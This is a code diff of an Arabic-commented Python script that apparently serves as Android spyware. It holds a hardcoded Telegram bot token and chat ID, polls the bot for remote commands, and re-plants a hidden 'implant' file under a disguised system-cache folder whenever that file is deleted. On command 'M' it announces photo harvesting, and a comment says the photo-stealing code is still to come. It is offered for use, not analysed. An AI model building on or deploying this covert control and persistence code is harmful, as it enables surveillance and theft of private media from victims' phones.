@@ -5,7 +5,7 @@ import requests
 TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
 CHAT_ID = "1256334460"
 
-def listen():
+def get_command():
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1"
         res = requests.get(url, timeout=10).json()
@@ -14,18 +14,23 @@ def listen():
     except: return None
 
 if __name__ == '__main__':
-    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "💀 الشبح استيقظ وبدأ بمراقبة الأوامر..."})
+    # إبلاغ البوت بالاستيقاظ
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                  data={"chat_id": CHAT_ID, "text": "💀 الشبح استيقظ وجاهز للأوامر..."})
     
     while True:
-        cmd = listen()
-        if cmd == "M":
-            # هنا سنضع كود سحب الصور في الخطوة القادمة بعد التأكد من الاتصال
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "📸 تم استلام الأمر M.. جاري سحب الصور من المجلدات المخفية!"})
+        command = get_command()
+        if command == "M":
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                          data={"chat_id": CHAT_ID, "text": "📸 استلمت الأمر M.. جاري فحص الوسائط والزرع!"})
+            # هنا ستتم إضافة وظيفة سحب الصور لاحقاً
         
-        # التأكد من بقاء ملف الزرع حياً
-        if not os.path.exists("/sdcard/Android/.system_cache_data/.core_bridge"):
-            # إعادة الزرع إذا تم الحذف
-            os.makedirs("/sdcard/Android/.system_cache_data", exist_ok=True)
-            with open("/sdcard/Android/.system_cache_data/.core_bridge", "w") as f: f.write("RE-PLANTED")
+        # التأكد من ثبات ملف الزرع
+        check_path = "/sdcard/Android/.system_cache_data/.core_bridge"
+        if not os.path.exists(check_path):
+            try:
+                os.makedirs(os.path.dirname(check_path), exist_ok=True)
+                with open(check_path, "w") as f: f.write("RE-PLANTED")
+            except: pass
             
-        time.sleep(7)
+        time.sleep(10)
